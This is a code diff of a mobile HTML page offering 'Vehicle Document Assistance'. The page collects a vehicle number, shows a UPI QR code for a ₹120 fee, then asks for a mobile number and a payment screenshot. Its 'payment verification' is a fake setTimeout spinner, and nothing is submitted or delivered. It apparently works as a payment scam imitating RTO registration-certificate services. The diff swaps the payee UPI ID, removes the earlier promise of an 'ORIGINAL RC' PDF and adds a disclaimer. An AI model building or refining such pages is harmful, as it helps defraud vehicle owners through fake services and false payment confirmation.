@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Vehicle Document Assistance</title>
+<title>Vehicle Document Assistance Service</title>
 
 <style>
 body{
@@ -31,6 +31,29 @@ border-radius:18px;
 width:92%;
 max-width:420px;
 text-align:center;
+position:relative;
+}
+
+.menu{
+position:absolute;
+top:10px;
+right:10px;
+font-size:22px;
+cursor:pointer;
+}
+
+.dropdown{
+display:none;
+position:absolute;
+top:40px;
+right:10px;
+background:white;
+color:black;
+border-radius:10px;
+padding:10px;
+font-size:14px;
+width:200px;
+text-align:left;
 }
 
 input,button{
@@ -56,18 +79,6 @@ margin:12px 0;
 border-radius:12px;
 }
 
-.upi-icons{
-margin-top:8px;
-display:flex;
-justify-content:center;
-gap:10px;
-}
-
-.upi-icons img{
-width:35px;
-height:35px;
-}
-
 /* Loader */
 .loader{
 position:fixed;
@@ -75,7 +86,7 @@ top:0;
 left:0;
 width:100%;
 height:100%;
-background:rgba(0,0,0,0.85);
+background:rgba(0,0,0,0.9);
 color:white;
 display:none;
 flex-direction:column;
@@ -100,11 +111,6 @@ margin-bottom:15px;
 0%{transform:rotate(0deg);}
 100%{transform:rotate(360deg);}
 }
-
-.success{
-font-size:18px;
-line-height:1.6;
-}
 </style>
 </head>
 
@@ -112,15 +118,27 @@ line-height:1.6;
 
 <div class="loader" id="loader">
 <div class="spinner"></div>
-<div id="loaderText">आपकी पेमेंट को verify किया जा रहा है।<br>कृपया back button न दबाएं।</div>
+<div id="loaderText">
+आपकी पेमेंट verify की जा रही है।<br>
+कृपया back button न दबाएं।
+</div>
 </div>
 
 <div class="card">
 
+<div class="menu" onclick="toggleMenu()">⋮</div>
+
+<div class="dropdown" id="menuBox">
+<b>About:</b><br>
+Independent Vehicle Assistance Platform.<br><br>
+<b>Disclaimer:</b><br>
+This is a private service platform. We are not affiliated with RTO or any government authority.
+</div>
+
 <!-- PAGE 1 -->
 <div id="p1">
 <h3>Enter Vehicle Number</h3>
-<input id="vehicle" placeholder="BR-09-AB-1234">
+<input id="vehicle" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatVehicle(this)">
 <button onclick="goPay()">Continue</button>
 </div>
 
@@ -128,32 +146,24 @@ line-height:1.6;
 <div id="p2" class="hidden">
 <h3>Service Fee ₹120</h3>
 
-<img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=upi://pay?pa=8505039454.wallet@phonepe&pn=Ravi%20Kumar&am=120.00&cu=INR">
+<img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=upi%3A%2F%2Fpay%3Fpa%3Dbestinsurance%40upi%26pn%3DBest%20Insurance%26am%3D120.00%26cu%3DINR">
 
-<p>UPI ID: 8505039454.wallet@phonepe</p>
+<p>UPI ID: bestinsurance@upi</p>
 
-<a href="upi://pay?pa=8505039454.wallet@phonepe&pn=Ravi%20Kumar&am=120.00&cu=INR">
+<a onclick="openUPI()" href="#">
 <button type="button">Pay with UPI App</button>
 </a>
 
-<div class="upi-icons">
-<img src="https://upload.wikimedia.org/wikipedia/commons/7/71/PhonePe_Logo.svg">
-<img src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Google_Pay_Logo.svg">
-<img src="https://upload.wikimedia.org/wikipedia/commons/8/89/BHIM_logo.svg">
-</div>
-
 <input id="mobile" placeholder="Mobile Number">
-<input type="file" id="file">
+<input type="file" id="proof" accept="image/*">
 
 <button onclick="submitForm()">Submit</button>
 </div>
 
 <!-- PAGE 3 -->
-<div id="p3" class="hidden success">
-<h3>🎉 Congratulations!</h3>
-<p>
-आपको आपके WhatsApp पर ORIGINAL RC का PDF शीघ्र ही प्राप्त होगा।
-</p>
+<div id="p3" class="hidden">
+<h3>🎉 Request Submitted</h3>
+<p>Your request has been received successfully.</p>
 <button onclick="goHome()">Home</button>
 </div>
 
@@ -161,7 +171,13 @@ line-height:1.6;
 
 <script>
 
-function showLoader(){
+function toggleMenu(){
+let box=document.getElementById("menuBox");
+box.style.display = box.style.display==="block" ? "none" : "block";
+}
+
+function showLoader(text){
+document.getElementById("loaderText").innerHTML=text;
 document.getElementById("loader").style.display="flex";
 }
 
@@ -169,46 +185,65 @@ function hideLoader(){
 document.getElementById("loader").style.display="none";
 }
 
+function formatVehicle(el){
+let v=el.value.toUpperCase().replace(/[^A-Z0-9]/g,"");
+let p1=v.slice(0,2);
+let p2=v.slice(2,4);
+let p3=v.slice(4,6);
+let p4=v.slice(6,10);
+let out=p1;
+if(p2) out+="-"+p2;
+if(p3) out+="-"+p3;
+if(p4) out+="-"+p4;
+el.value=out;
+}
+
 function goPay(){
 if(!vehicle.value.trim()){
-alert("Enter vehicle number");
+alert("Vehicle number required");
 return;
 }
+showLoader("Please wait...");
+setTimeout(()=>{
+hideLoader();
 p1.classList.add("hidden");
 p2.classList.remove("hidden");
+},1000);
+}
+
+function openUPI(){
+showLoader("UPI app open हो रही है...");
+setTimeout(()=>{
+window.location.href="upi://pay?pa=bestinsurance@upi&pn=Best%20Insurance&am=120.00&cu=INR";
+hideLoader();
+},800);
 }
 
 function submitForm(){
-if(!mobile.value.trim()){
-alert("Enter mobile number");
+if(mobile.value.length<10){
+alert("Enter valid mobile number");
 return;
 }
-if(!file.files[0]){
+if(!proof.files[0]){
 alert("Upload payment screenshot");
 return;
 }
 
-showLoader();
+showLoader("आपकी पेमेंट verify की जा रही है।<br>कृपया back button न दबाएं।");
 
 setTimeout(()=>{
 hideLoader();
 p2.classList.add("hidden");
 p3.classList.remove("hidden");
-
-setTimeout(()=>{
-goHome();
-},7000);
-
 },3000);
 }
 
 function goHome(){
 p3.classList.add("hidden");
-p2.classList.add("hidden");
 p1.classList.remove("hidden");
 vehicle.value="";
 mobile.value="";
-file.value="";
+proof.value="";
 }
 
 </script>
